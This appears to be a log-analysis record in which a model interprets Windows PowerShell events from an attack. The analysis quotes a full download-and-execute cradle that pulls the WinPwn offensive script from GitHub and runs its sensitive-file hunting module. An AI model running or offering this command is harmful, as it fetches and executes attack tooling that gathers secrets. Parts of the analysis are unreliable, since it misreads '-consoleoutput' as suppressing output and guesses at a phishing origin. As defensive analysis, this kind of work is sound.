{"file":"filtering\/phi4-mini\/attack\/20250606_143748.jsonl","analysis":"This log appears to be from a Windows system that was compromised by a PowerShell script downloaded from a GitHub repository called \"WinPwn\". Here's a breakdown of the key events:\n\n1. **Initial PowerShel.exe Process**: The first few lines indicate that an initial process was launched with the command line argument `powershell -exec bypass`. This suggests that the attacker attempted to execute a PowerShell command directly, possibly as a result of a phishing email or malicious link click.\n\n2. **Multiple Command Lines**: After the initial execution, multiple instances are seen with the same command-line arguments, including `powershell -exec bypass` and then `powershell.exe & {iex(new-object net.webclient).downloadstring('https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/121dcee26a7aca368821563cbe92b2b5638c5773\/WinPwn.ps1')\\nsensitivefiles -noninteractive -consoleoutput}`. The second command suggests a PowerShell download and execution from the same GitHub repository as the initial script, but with different arguments.\n\n3. **Download of WinPwn Script**: This indicates that the attacker used this mechanism to download and execute additional scripts from their repository. These scripts are likely designed to gather sensitive information (hence `sensitivefiles`) without interactive console output (`-consoleoutput`).\n\n4. **Provider Lifecycle Events**: Many instances show events related to \"Provider Lifecycle\" and \"Engine Lifecycle\". This can be misleading because it implies some kind of legitimate action or error in the PowerShell engine's lifecycle, which might distract from the actual malicious activity.\n\n5. **File Creation\/Modification Activity**: There are several lines indicating file creation or modification activities, likely as a result of the executed scripts downloading and writing files to the system.\n\nTo mitigate such attacks:\n\n- **Keep your system and software up-to-date**, especially PowerShell.\n- **Use reputable antivirus software** that can detect and prevent malware.\n- **Be cautious with links and email attachments**, ensuring they are from trusted sources before opening them or allowing script execution.\n- **Monitor your network activity** for suspicious downloads, especially from GitHub repositories."}
